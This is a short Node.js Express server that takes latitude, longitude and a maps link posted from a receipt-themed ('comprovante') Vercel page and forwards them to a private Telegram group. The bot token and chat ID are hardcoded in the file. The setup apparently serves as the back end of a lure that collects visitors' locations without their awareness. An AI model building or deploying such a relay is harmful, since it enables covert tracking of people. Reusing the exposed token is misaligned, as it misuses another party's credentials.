// server.js
const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const axios = require("axios");
const app = express();
const port = 8088;

app.use(cors({
  origin: 'https://comprovante-sepia.vercel.app/',
  methods: 'GET,HEAD,PUT,PATCH,POST,DELETE', // Métodos HTTP permitidos

}));
app.use(bodyParser.json());

const TELEGRAM_BOT_TOKEN = "7944401182:AAEcw_FrghN02kKKHu5N3KxXgDglqk7EO2U";
const TELEGRAM_CHAT_ID = -1002659707249; // Substitua pelo ID do chat (ou grupo) para onde quer enviar

app.post("/send-location", async (req, res) => {
  const { latitude, longitude, maps } = req.body;

  const message = `A localização do usuário é:\nLatitude: ${latitude}\nLongitude: ${longitude}\nMaps: ${maps}`;

  try {
    // Envia a localização para o Telegram
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
    });

    res.status(200).json({ success: true });
  } catch (error) {
    console.log(error);
    res.status(500).json({ success: false, message: "Erro ao enviar a localização para o Telegram." });
  }
});

app.listen(port, () => {
  console.log(`Servidor rodando na porta ${port}`);
});
